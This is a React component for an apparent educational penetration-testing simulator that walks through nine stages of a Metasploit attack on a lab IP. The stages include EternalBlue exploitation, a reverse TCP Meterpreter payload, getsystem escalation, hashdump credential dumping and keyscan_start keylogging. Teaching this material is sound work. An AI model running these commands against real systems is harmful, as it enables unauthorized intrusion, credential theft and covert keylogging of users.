import React, { useState } from 'react';
import { useSimulator } from '../context/SimulatorContext';
import { Shield, CheckCircle, Search, Eye, Play, Award, HelpCircle, FileText } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';

interface AttackStage {
  title: string;
  shortDesc: string;
  detailedDesc: string;
  metasploitUsage: string;
  commands: string[];
  tips: string;
}

const stages: AttackStage[] = [
  {
    title: 'Reconnaissance',
    shortDesc: 'Gathering information about the target host\'s open ports and operating system.',
    detailedDesc: 'Before launching any exploits, a penetration tester gathers information about the target. This involves mapping network structures, checking which ports are active, and identifying services running on those ports (e.g. HTTP, SSH, SMB).',
    metasploitUsage: 'Metasploit includes tools to integrate vulnerability scanning and port scanning directly into the database system.',
    commands: [
      'db_nmap -sV 192.168.1.50   # Scans target and detects service versions',
      'use auxiliary/scanner/portscan/tcp   # Internal TCP port scanner module'
    ],
    tips: 'A thorough reconnaissance is 90% of a successful penetration test. Knowing the exact service version avoids triggering service crashes.'
  },
  {
    title: 'Vulnerability Discovery',
    shortDesc: 'Identifying weaknesses or outdated software running on target services.',
    detailedDesc: 'Once open services are cataloged, they are checked against vulnerability databases. Penetration testers search for software versions known to have security flaws or run scanners that test for anomalies.',
    metasploitUsage: 'Metasploit contains thousands of auxiliary scanners that check for vulnerabilities (like MS17-010 or Log4Shell) without running exploits.',
    commands: [
      'use auxiliary/scanner/smb/smb_ms17_010   # Detects if EternalBlue is present',
      'use auxiliary/scanner/http/log4j_scanner   # Scans for Log4j lookup endpoints'
    ],
    tips: 'Discovery scanners should be non-intrusive. They check header flags or configuration replies to verify vulnerability status.'
  },
  {
    title: 'Exploit Selection',
    shortDesc: 'Choosing the appropriate exploit code corresponding to the discovered bug.',
    detailedDesc: 'With a confirmed vulnerability, the tester searches the Metasploit database for matching exploit modules. These are scripts designed to trigger the identified bug to gain code execution.',
    metasploitUsage: 'The search command queries Metasploit\'s internal database for relevant modules.',
    commands: [
      'search ms17_010   # Searches database for EternalBlue modules',
      'use exploit/windows/smb/ms17_010_eternalblue   # Selects the exploit'
    ],
    tips: 'Ensure the exploit module matches the specific version of the software. Running the wrong exploit might crash the service (DoS).'
  },
  {
    title: 'Payload Selection',
    shortDesc: 'Selecting the payload script to execute on the victim after exploitation.',
    detailedDesc: 'The exploit only provides the entry pathway. The payload is the actual code injected and run on the victim machine. It defines what control the tester has (e.g. command shell, VNC view, or Meterpreter).',
    metasploitUsage: 'Metasploit allows linking various payloads to exploits depending on target architecture (Windows, Linux, Java).',
    commands: [
      'show payloads   # Lists compatible payloads for the selected exploit',
      'set PAYLOAD windows/x64/meterpreter/reverse_tcp   # Selects a reverse TCP Meterpreter'
    ],
    tips: 'A "reverse" payload tells the victim computer to connect back to the attacker. This bypasses most default inbound firewalls.'
  },
  {
    title: 'Exploitation',
    shortDesc: 'Executing the exploit to trigger the bug and run the payload.',
    detailedDesc: 'During this stage, configuration parameters (RHOSTS, LHOST) are set, and the exploit is executed. Metasploit sends the exploit payload packets to the victim, leveraging the memory vulnerability or injection flaw.',
    metasploitUsage: 'The run or exploit command initiates the connection and attacks the target.',
    commands: [
      'set RHOSTS 192.168.1.50   # Configures remote target IP',
      'set LHOST 192.168.1.10   # Configures local listening IP',
      'exploit   # Launches attack sequence'
    ],
    tips: 'Watch logs carefully. Firewalls, network congestion, or endpoint protection may interrupt the exploit stream.'
  },
  {
    title: 'Session Creation',
    shortDesc: 'Establishing a remote connection channel back to the attacker VM.',
    detailedDesc: 'If the exploit succeeds, the payload loads into the memory of the target machine. A connection is established back to the attacker, creating an active interactive session.',
    metasploitUsage: 'Sessions are managed via the sessions command. They can be placed in the background or interacted with.',
    commands: [
      'sessions   # Displays active communication channels',
      'sessions -i 1   # Interacts with session ID 1'
    ],
    tips: 'A Meterpreter session resides completely in RAM, leaving no footprint on the hard disk, making it harder for simple antivirus to detect.'
  },
  {
    title: 'Privilege Escalation',
    shortDesc: 'Upgrading the shell permissions to root or administrative system level.',
    detailedDesc: 'Often, initial access is limited to a low-privileged system user (e.g., standard apache user). Privilege escalation involves taking advantage of OS bugs, service config errors, or passwords to gain full administrator (root/SYSTEM) privileges.',
    metasploitUsage: 'Meterpreter provides local exploit suggestions and automation to gain admin rights.',
    commands: [
      'getuid   # Shows current user context',
      'getsystem   # Auto-attempts multiple local escalation tactics (Windows)',
      'use post/multi/recon/local_exploit_suggester   # Scans for kernel exploits'
    ],
    tips: 'Gaining administrative rights is required to run deep forensic commands, view passwords, or alter system configurations.'
  },
  {
    title: 'Post Exploitation',
    shortDesc: 'Gathering local information, listing processes, and recovering credentials.',
    detailedDesc: 'With high-level credentials, the penetration tester gathers information to assess the target system. This includes extracting password hashes, mapping local directories, listing active processes, and setting up persistent mechanisms.',
    metasploitUsage: 'Meterpreter provides dedicated post-exploitation modules for information dumping.',
    commands: [
      'sysinfo   # Details OS architectures',
      'hashdump   # Dumps local security account database hashes',
      'keyscan_start   # Commences software keylogger to capture user typing'
    ],
    tips: 'Always respect target data privacy. Post-exploitation in an authorized audit is done strictly to catalog risk scope.'
  },
  {
    title: 'Reporting',
    shortDesc: 'Writing documentation of findings, risk assessment, and mitigation suggestions.',
    detailedDesc: 'The final, most important phase of a penetration test. The auditor creates a report listing found vulnerabilities, how they were exploited, the severity impact of system access, and details on how the IT team can patch and block the attacks.',
    metasploitUsage: 'Metasploit allows logging execution commands and export xml files of target data.',
    commands: [
      'spool console.txt   # Starts logging terminal session stdout to file',
      'db_export -f xml report.xml   # Exports hosts database to XML file'
    ],
    tips: 'A report must provide clear mitigation guides. A penetration test is useless unless the organization knows how to defend itself.'
  }
];

export const AttackFlow: React.FC = () => {
  const { completedStages, markStageComplete } = useSimulator();
  const [activeStage, setActiveStage] = useState<number>(0);

  const getStageIcon = (index: number) => {
    switch (index) {
      case 0: return <Search className="h-5 w-5" />;
      case 1: return <Eye className="h-5 w-5" />;
      case 2: return <Award className="h-5 w-5" />;
      case 3: return <HelpCircle className="h-5 w-5" />;
      case 4: return <Play className="h-5 w-5" />;
      case 5: return <CheckCircle className="h-5 w-5" />;
      case 6: return <Shield className="h-5 w-5" />;
      case 7: return <Award className="h-5 w-5" />;
      default: return <FileText className="h-5 w-5" />;
    }
  };

  const nextStage = () => {
    if (activeStage < stages.length - 1) {
      setActiveStage(prev => prev + 1);
    }
  };

  const prevStage = () => {
    if (activeStage > 0) {
      setActiveStage(prev => prev - 1);
    }
  };

  return (
    <div className="grid grid-cols-1 lg:grid-cols-4 gap-6">
      {/* Stages Side Navigation */}
      <div className="lg:col-span-1 glass-panel rounded-xl p-4 border-slate-800 space-y-2">
        <h3 className="text-sm font-mono text-emerald-400 mb-4 tracking-wider uppercase">
          ATTACK LIFECYCLE
        </h3>
        <div className="space-y-1">
          {stages.map((stage, idx) => {
            const isCompleted = completedStages.includes(idx);
            const isActive = idx === activeStage;
            
            return (
              <button
                key={idx}
                onClick={() => setActiveStage(idx)}
                className={`w-full text-left font-mono text-xs p-2.5 rounded-lg flex items-center justify-between transition-all cursor-pointer ${
                  isActive
                    ? 'bg-emerald-950/40 text-emerald-400 border border-emerald-500/30'
                    : 'hover:bg-slate-900/60 text-slate-400 border border-transparent'
                }`}
              >
                <div className="flex items-center gap-2 truncate">
                  <span className={`text-[10px] h-5 w-5 rounded-full flex items-center justify-center border ${
                    isActive 
                      ? 'border-emerald-400 text-emerald-400' 
                      : isCompleted
                        ? 'border-emerald-600/30 bg-emerald-900/10 text-emerald-500'
                        : 'border-slate-800 text-slate-500'
                  }`}>
                    {idx + 1}
                  </span>
                  <span className="truncate">{stage.title}</span>
                </div>
                {isCompleted && <CheckCircle className="h-4 w-4 text-emerald-500 shrink-0 ml-2" />}
              </button>
            );
          })}
        </div>
      </div>

      {/* Stage Detail panel */}
      <div className="lg:col-span-3">
        <AnimatePresence mode="wait">
          <motion.div
            key={activeStage}
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -10 }}
            transition={{ duration: 0.2 }}
            className="glass-panel rounded-xl p-6 border-slate-800 flex flex-col justify-between min-h-[480px]"
          >
            {/* Upper Content */}
            <div className="space-y-4">
              <div className="flex justify-between items-center border-b border-slate-800 pb-3">
                <div className="flex items-center gap-3">
                  <div className="p-2 rounded-lg bg-emerald-950/40 border border-emerald-500/30 text-emerald-400">
                    {getStageIcon(activeStage)}
                  </div>
                  <div>
                    <h3 className="text-lg font-mono font-bold text-white uppercase tracking-wider">
                      Stage {activeStage + 1}: {stages[activeStage].title}
                    </h3>
                    <p className="text-[10px] text-slate-500 font-mono">
                      Phase {activeStage + 1} of 9 in cybersecurity exploitation methodologies
                    </p>
                  </div>
                </div>

                <button
                  onClick={() => markStageComplete(activeStage)}
                  className={`px-3 py-1.5 rounded-lg font-mono text-xs flex items-center gap-1.5 transition-all cursor-pointer ${
                    completedStages.includes(activeStage)
                      ? 'bg-emerald-900/10 text-emerald-400 border border-emerald-500/20'
                      : 'bg-emerald-600 hover:bg-emerald-500 text-slate-950 font-bold'
                  }`}
                >
                  <CheckCircle className="h-4 w-4" />
                  {completedStages.includes(activeStage) ? 'MASTERED' : 'MARK AS READ'}
                </button>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-5 gap-6 py-2">
                {/* Description columns */}
                <div className="md:col-span-3 space-y-4">
                  <div>
                    <h4 className="text-xs font-mono text-slate-400 font-bold uppercase mb-1">Overview:</h4>
                    <p className="text-xs text-slate-300 font-mono leading-relaxed">
                      {stages[activeStage].detailedDesc}
                    </p>
                  </div>

                  <div>
                    <h4 className="text-xs font-mono text-slate-400 font-bold uppercase mb-1">Defense Tip:</h4>
                    <div className="bg-slate-900/50 border border-slate-800/80 p-3 rounded-lg text-xs font-mono text-slate-400 leading-relaxed">
                      {stages[activeStage].tips}
                    </div>
                  </div>
                </div>

                {/* Commands columns */}
                <div className="md:col-span-2 space-y-4">
                  <div className="space-y-2">
                    <h4 className="text-xs font-mono text-slate-400 font-bold uppercase">Console Examples:</h4>
                    <p className="text-[10px] text-slate-500 font-mono leading-relaxed">
                      {stages[activeStage].metasploitUsage}
                    </p>
                    <div className="bg-slate-950 border border-slate-800 rounded-lg p-3 font-mono text-[10px] text-emerald-400 space-y-2 overflow-x-auto shadow-inner">
                      {stages[activeStage].commands.map((cmd, i) => (
                        <div key={i} className="whitespace-pre">
                          <span className="text-slate-600 select-none">msf6 &gt;</span> {cmd}
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* Bottom Navigation Controls */}
            <div className="flex justify-between items-center border-t border-slate-800 pt-4 mt-6">
              <button
                disabled={activeStage === 0}
                onClick={prevStage}
                className="px-4 py-2 border border-slate-800 hover:border-slate-700 bg-slate-900/40 rounded-lg font-mono text-xs text-slate-400 disabled:opacity-30 disabled:cursor-not-allowed hover:text-white cursor-pointer"
              >
                &larr; Previous Stage
              </button>
              <span className="text-xs font-mono text-slate-500">
                Step {activeStage + 1} of 9
              </span>
              <button
                disabled={activeStage === stages.length - 1}
                onClick={nextStage}
                className="px-4 py-2 border border-slate-800 hover:border-slate-700 bg-slate-900/40 rounded-lg font-mono text-xs text-slate-400 disabled:opacity-30 disabled:cursor-not-allowed hover:text-white cursor-pointer"
              >
                Next Stage &rarr;
              </button>
            </div>
          </motion.div>
        </AnimatePresence>
      </div>
    </div>
  );
};
